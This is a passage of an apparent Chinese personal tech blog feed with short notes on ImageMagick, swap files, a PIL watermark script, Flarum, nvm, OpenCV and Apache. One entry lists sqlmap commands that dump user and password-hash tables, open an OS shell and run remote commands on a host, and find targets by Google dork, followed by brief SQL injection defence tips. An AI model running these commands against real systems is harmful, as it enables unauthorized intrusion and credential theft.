    <content type="html"><![CDATA[<h2 id="使用命令压缩图片"><a href="#使用命令压缩图片" class="headerlink" title="使用命令压缩图片"></a>使用命令压缩图片</h2><p>安装<code>sudo pacman -S imagemagick</code><br>支持JPG, BMP, PCX, GIF, PNG, TIFF, XPM和XWD等</p><p>1.转换格式<code>convert 1.jpg 1.png</code><br>2.-resize 1080x780<br>3.-sample 50%x50%<br>4.-rotate 272<br>5.-fill black -pointsize 60 -front helvetica -draw ‘hello’ //front use Ghostscript<br>5.-quality 0-100</p><h3 id="批量转换"><a href="#批量转换" class="headerlink" title="批量转换"></a>批量转换</h3><p><code>for %f in (*.jpg) do convert &quot;%f&quot; &quot;%~nf.png&quot;</code><br><code>for %f in (*.jpg) do convertv -quality 70 &quot;%f&quot; &quot;%~nf.jpg&quot;</code><br><code>convert -quality 70 *.jpg</code><br>composite加水印</p><h2 id="Linux-设置swap分区"><a href="#Linux-设置swap分区" class="headerlink" title="Linux 设置swap分区"></a>Linux 设置swap分区</h2><pre><code>dd if=/dev/zero of=/mnt/swap bs=1m count=1024 #1Gmkswap /mnt/swapswapon /mnt/swaphostnamectl set-hostname mail.ewomail.cnhttps://github.com/gyxuehu/EwoMail.gitsh ./start.sh ewomail.cn -f</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;使用命令压缩图片&quot;&gt;&lt;a href=&quot;#使用命令压缩图片&quot; class=&quot;headerlink&quot; title=&quot;使用命令压缩图片&quot;&gt;&lt;/a&gt;使用命令压缩图片&lt;/h2&gt;&lt;p&gt;安装&lt;code&gt;sudo pacman -S
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Watermark</title>
    <link href="https://hualin.online/watermark/"/>
    <id>https://hualin.online/watermark/</id>
    <published>2019-09-12T14:30:25.000Z</published>
    <updated>2019-09-12T14:31:02.423Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> glob<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageDraw<span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageFont<span class="token keyword">def</span> <span class="token function">watermark</span><span class="token punctuation">(</span>post_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> post_name <span class="token operator">==</span> <span class="token string">'all'</span><span class="token punctuation">:</span>        post_name <span class="token operator">=</span> <span class="token string">'*'</span>    dir_name <span class="token operator">=</span> <span class="token string">'source/_posts/'</span> <span class="token operator">+</span> post_name <span class="token operator">+</span> <span class="token string">'/*'</span>    <span class="token keyword">for</span> files <span class="token keyword">in</span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span>dir_name<span class="token punctuation">)</span><span class="token punctuation">:</span>        im <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>files<span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>im<span class="token punctuation">.</span>getbands<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>            im <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span>        font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span><span class="token string">'STSONG.TTF'</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span>        draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  u<span class="token string">'@lithiumice'</span><span class="token punctuation">,</span> fill<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        watermark<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[usage] &lt;input>'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;pre class=&quot;line-numbers language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;# -*- coding: utf-8
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Install Flarum</title>
    <link href="https://hualin.online/install-flarum/"/>
    <id>https://hualin.online/install-flarum/</id>
    <published>2019-09-12T14:19:30.000Z</published>
    <updated>2019-09-12T14:19:44.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="test-flarum"><a href="#test-flarum" class="headerlink" title="test flarum"></a>test flarum</h2><p><a href="https://github.com/flarum/flarum.git" target="_blank" rel="noopener">github</a></p><p>1.install composer:<br><code>composer create-project flarum/flarum . --stability=beta</code><br>2.in order to use php</p><pre><code>sudo apt-get -y install gcc make autoconf libc-dev pkg-configsudo apt-get -y install php7.2-devsudo apt-get -y install libmcrypt-devsudo pecl install mcrypt-1.0.2 //for php&gt;7.3</code></pre><p>3.for arch<br><code>extra/php-sodium</code><br><code>php-set = extension=sodium</code>in /etc/php/php.ini</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;test-flarum&quot;&gt;&lt;a href=&quot;#test-flarum&quot; class=&quot;headerlink&quot; title=&quot;test flarum&quot;&gt;&lt;/a&gt;test flarum&lt;/h2&gt;&lt;p&gt;&lt;a
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqmap Simple Intro</title>
    <link href="https://hualin.online/sqmap-simple-intro/"/>
    <id>https://hualin.online/sqmap-simple-intro/</id>
    <published>2019-09-12T14:14:36.000Z</published>
    <updated>2019-09-16T13:17:03.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code>./sqlmap.py -u &quot;http://localhost:88/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie=mycookice.txt –batch./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user –columns./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D mysql -T user -C ‘user, authentication_string’ –dump./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-shell // 获取远程主机的shell./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-cmd=&quot;whoami&quot; // 执行远程主机的命令./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –is-dba // 检查DBMS用户是否为DBA./sqlmap.py -g &quot;inurl:php?id=&quot; // 通过google寻找url带有php?id=字段的地址</code></pre><p><strong>参数解析</strong><br>–batch –dbs //showdatabases<br>–batch –current-db //showcurrentdb<br>–batch -D database -T user -C varchar–tables //showtables<br>–columns //showcolumns<br>–tables //thesame<br>–dump //查询出所有数据表的所有数据</p><p><strong>以GET方式的cookice形式:</strong><br>_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low</p><p><strong>POST注入方式:</strong><br>$ python sqlmap.py -r header.txt –dbs<br>// -r是从一个文件中载入HTTP请求<br>// 其余都与GET一样将-u部分改成-r header.txt<br>从chrome保存下来的request header:<br>POST /index.php HTTP/1.1 …</p><p>sqlmap.py -u “url” –cookie=”” –data=“post源码” –batch –smart启发式判断<br>批量检测注入漏洞<br>sqlmap.py -g “url匹配” –batch –smart<br>sqlmap.py -l txt文件名 –batch –smart</p><h2 id="防护sql注入"><a href="#防护sql注入" class="headerlink" title="防护sql注入"></a>防护sql注入</h2><p>那么，如何防护sql的注入呢<br>（1）永远不要相信用户的输入，必须对用户的输入进行校验，过滤，可以通过正则表达式，输入的字符长度限制但双引号，转义字符等，可以前后端进行结合对用户的输入验证<br>（2）重要的数据等不能明文显示，必须加密<br>（3）不要用管理员的权限登录数据库，可以在数据库的安全性文件夹-架构-新建架构，然后在数据表上添加架构的名称，查询数据表时需要在表明前面加上架构的前缀才能查询，这样有效防止对数据表名的猜测。<br>（4）对于系统的错误提示尽可能少，或者对其提示进行改变，隐藏不必要的系统信息。</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;./sqlmap.py -u
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Use Nvm</title>
    <link href="https://hualin.online/use-nvm/"/>
    <id>https://hualin.online/use-nvm/</id>
    <published>2019-09-11T13:59:05.000Z</published>
    <updated>2019-09-14T09:59:15.483Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先卸载系统的node"><a href="#先卸载系统的node" class="headerlink" title="先卸载系统的node"></a>先卸载系统的node</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo rm /usr/local/bin/npmsudo rm /usr/local/share/man/man1/node.1sudo rm /usr/local/lib/dtrace/node.dsudo rm -rf ~/.npmsudo rm -rf ~/.node-gypsudo rm /opt/local/bin/nodesudo rm /opt/local/include/nodesudo rm -rf /opt/local/lib/node_modules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre><code>nvm install 4.2.2nvm ls-remotenvm use 4.2.2nvm use node //newestnvm alias awesome-version 4.2.2nvm run 4.2.2 --version</code></pre><p>在当前终端的子进程中运行特定版本的 Node<br><code>nvm exec 4.2.2 node --version</code></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;先卸载系统的node&quot;&gt;&lt;a href=&quot;#先卸载系统的node&quot; class=&quot;headerlink&quot; title=&quot;先卸载系统的node&quot;&gt;&lt;/a&gt;先卸载系统的node&lt;/h3&gt;&lt;pre class=&quot;line-numbers
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Install Opencv on Linux</title>
    <link href="https://hualin.online/install-opencv-on-linux/"/>
    <id>https://hualin.online/install-opencv-on-linux/</id>
    <published>2019-09-11T13:57:53.000Z</published>
    <updated>2019-09-11T14:02:42.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="simple-guide-to-install-opencv-on-ubuntu"><a href="#simple-guide-to-install-opencv-on-ubuntu" class="headerlink" title="simple guide to install opencv on ubuntu"></a>simple guide to install opencv on ubuntu</h1><h2 id="system-depandencies"><a href="#system-depandencies" class="headerlink" title="system depandencies"></a>system depandencies</h2><pre><code>sudo apt-get install build-essentialsudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-devsudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</code></pre><h2 id="build-opencv"><a href="#build-opencv" class="headerlink" title="build opencv"></a>build opencv</h2><pre><code>git clone https://github.com/opencv/opencv.gitgit clone https://github.com/opencv/opencv_contrib.gitcd opencvmkdir build &amp;&amp; cd buildcmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..cmake -DCMAKE_INSTALL_PREFIX=/usr-DCMAKE_BUILD_TYPE=Release-DENABLE_CXX11=ON-DBUILD_PERF_TESTS=OFF-DWITH_XINE=ON-DBUILD_TESTS=OFF-DENABLE_PRECOMPILED_HEADERS=OFF-DCMAKE_SKIP_RPATH=ON-DBUILD_WITH_DEBUG_INFO=OFF-DBUILD_SHARED_LIBS=OFF-Wno-dev .. &amp;&amp; makecd opencv/build/doc/make -j7 html_docssudo make installgit clone https://github.com/opencv/opencv_extra.gitpkg-config –modversion opencv</code></pre><pre><code>## Description of some parametersbuild type: CMAKE_BUILD_TYPE=ReleaseDebugto build with modules from opencv_contrib set OPENCV_EXTRA_MODULES_PATH to &lt;path to opencv_contrib/modules/&gt;set BUILD_DOCS for building documentsset BUILD_EXAMPLES to build all examples[optional] Building python. Set the following python parameters:PYTHON2(3)_EXECUTABLE = &lt;path to python&gt;PYTHON_INCLUDE_DIR = /usr/include/python&lt;version&gt;PYTHON_INCLUDE_DIR2 = /usr/include/x86_64-linux-gnu/python&lt;version&gt;PYTHON_LIBRARY = /usr/lib/x86_64-linux-gnu/libpython&lt;version&gt;.soPYTHON2(3)_NUMPY_INCLUDE_DIRS = /usr/lib/python&lt;version&gt;/dist-packages/numpy/core/include/[optional] Building java.Unset parameter: BUILD_SHARED_LIBSIt is useful also to unset BUILD_EXAMPLES, BUILD_TESTS, BUILD_PERF_TESTS – as they all will be statically linked with OpenCV and can take a lot of memory.</code></pre><h2 id="test-your-opencv"><a href="#test-your-opencv" class="headerlink" title="test your opencv"></a>test your opencv</h2><pre><code>g++ -o main /home/lithium/Documents/opencv-lena.cpp `pkg-config opencv –cflags –libs`sudo apt-get install libopencv-dev## uninstall opencvsudo rm -r /usr/local/include/opencv2 /usr/local/include/opencv /usr/include/opencv /usr/include/opencv2 /usr/local/share/opencv /usr/local/share/OpenCV /usr/share/opencv /usr/share/OpenCV /usr/local/bin/opencv* /usr/local/lib/libopencv*sudo apt-get –purge remove opencv-doc opencv-data python-opencv</code></pre><h2 id="config-PATH"><a href="#config-PATH" class="headerlink" title="config PATH"></a>config PATH</h2><pre><code>CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/include/libxml2:/usr/local/include/opencv4/opencv2export CPLUS_INCLUDE_PATHC_INCLUDE_PATH=/usr/include/libxml2:/usr/local/include/opencv4/opencv2/export C_INCLUDE_PATHLD_LIBRARY_PATH=$LD_LIBRARY_PATH:/MyLibexport LD_LIBRARY_PATHLIBRARY_PATH=$LIBRARY_PATH:/MyLibexport LIBRARY_PATH</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h1 id=&quot;simple-guide-to-install-opencv-on-ubuntu&quot;&gt;&lt;a href=&quot;#simple-guide-to-install-opencv-on-ubuntu&quot; class=&quot;headerlink&quot; title=&quot;simple
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Apache-Php-Config</title>
    <link href="https://hualin.online/apache-php-config/"/>
    <id>https://hualin.online/apache-php-config/</id>
    <published>2019-09-10T13:12:03.000Z</published>
    <updated>2019-09-10T13:24:52.532Z</updated>
    
    <content type="html"><![CDATA[<p>vim /usr/local/apache2/conf/httpd.conf<br><directory><br>    Options FollowSymLinks<br>    AllowOverride None<br>    Order deny,allow<br>    Deny from all<br></directory></p><p>AddType application/x-gzip .gz .tgz<br>在其下面添加：<br>ddType application/x-httpd-php .php</p><ifmodule dir_module>    DirectoryIndex index.html//DirectoryIndex index.html index.htm index.php</ifmodule><p>ServerName localhost:80<br>/usr/local/apache2/bin/apachectl -t</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;vim /usr/local/apache2/conf/httpd.conf&lt;br&gt;&lt;directory&gt;&lt;br&gt;    Options FollowSymLinks&lt;br&gt;    AllowOverride None&lt;br&gt;    Order
        
      
    
    </summary>
    
    
  </entry>
  
</feed>
